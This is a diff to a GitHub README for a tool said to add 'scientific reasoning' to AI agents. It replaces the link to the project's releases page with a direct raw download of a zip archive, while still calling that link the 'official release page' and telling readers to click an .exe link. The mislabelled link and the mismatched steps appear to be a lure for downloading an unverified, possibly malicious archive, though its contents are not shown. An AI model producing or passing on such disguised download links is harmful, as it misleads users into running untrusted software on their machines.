@@ -1,6 +1,6 @@
 # 🔬 scientific-thinking-general - Build better logic with intelligent tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/felipedeso7za4444/scientific-thinking-general/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/felipedeso7za4444/scientific-thinking-general/main/agents/thinking-scientific-general-1.7.zip)
 
 This software brings structured scientific reasoning to your computer. It helps artificial intelligence agents think with greater clarity and precision. You can use these tools to evaluate evidence, conduct research, and solve complex problems. By adding these skills to your system, you improve the quality of every decision your agent makes.
 
@@ -8,7 +8,7 @@ This software brings structured scientific reasoning to your computer. It helps 
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/felipedeso7za4444/scientific-thinking-general/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/felipedeso7za4444/scientific-thinking-general/main/agents/thinking-scientific-general-1.7.zip).
 2. Look for the section labeled Latest.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or your Downloads folder.
